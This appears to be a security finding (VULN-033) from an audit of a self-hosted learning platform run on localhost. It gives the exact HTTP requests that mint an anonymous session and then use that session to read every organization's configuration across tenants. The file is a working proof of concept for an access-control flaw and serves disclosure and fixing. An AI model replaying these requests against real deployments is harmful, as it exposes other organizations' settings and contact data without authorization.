### VULN-033 — GET /organization returns full org config to ANY session (incl. an anonymous one)

### Step 0 — baseline: with NO cookie the route rejects.
GET http://localhost:21527/organization HTTP/1.1
Host: localhost:21527
Origin: http://localhost:21526
### -> HTTP 401 Unauthorized

### Step 1 — mint an unauthenticated anonymous session (VULN-018): no account/signup/invite.
POST http://localhost:21527/api/auth/sign-in/anonymous HTTP/1.1
Host: localhost:21527
Origin: http://localhost:21526
Content-Type: application/json

{}
### -> HTTP 200, Set-Cookie: classroomio.session_token=<anon>   (user.isAnonymous=true, orgRoles={})

### Step 2 — read org config with the anonymous session cookie.
GET http://localhost:21527/organization HTTP/1.1
Host: localhost:21527
Origin: http://localhost:21526
Cookie: classroomio.session_token=<anon>

### Response: HTTP 200 — a LIST of full org config rows (cross-org enumeration), e.g.
### data[*].organization = { siteName, disableEmailPassword, disableGoogleAuth, disableSignup,
###   settings, customCode, aiTutorSettings{escalation.email,...}, landingpage, customDomain, plans, ... }
### Observed 2 orgs: "probe3f8bad" and "cve-hunt-academy" (the anon actor is a member of neither).
